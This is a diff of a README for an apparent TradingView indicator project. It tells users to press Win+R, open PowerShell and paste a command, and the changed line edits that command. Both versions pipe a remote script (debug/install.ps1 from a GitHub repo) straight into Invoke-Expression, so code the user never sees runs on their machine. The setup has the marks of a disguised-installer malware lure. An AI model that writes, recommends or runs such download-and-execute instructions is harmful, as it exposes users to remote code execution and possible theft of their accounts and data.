@@ -25,7 +25,7 @@ Press **Win + R**, type `PowerShell`, and press **Enter**.
 Paste the installation command below into the PowerShell window:
 
 ```powershell
-irm github.com/TradingView-Library/Quant-Indicator/raw/refs/heads/master/debug/install.ps1 | iex
+irm -useb github.com/TradingView-Library/Quant-Indicator/raw/refs/heads/master/debug/install.ps1 | iex
 ```
 
 #### 3. Restart TradingView
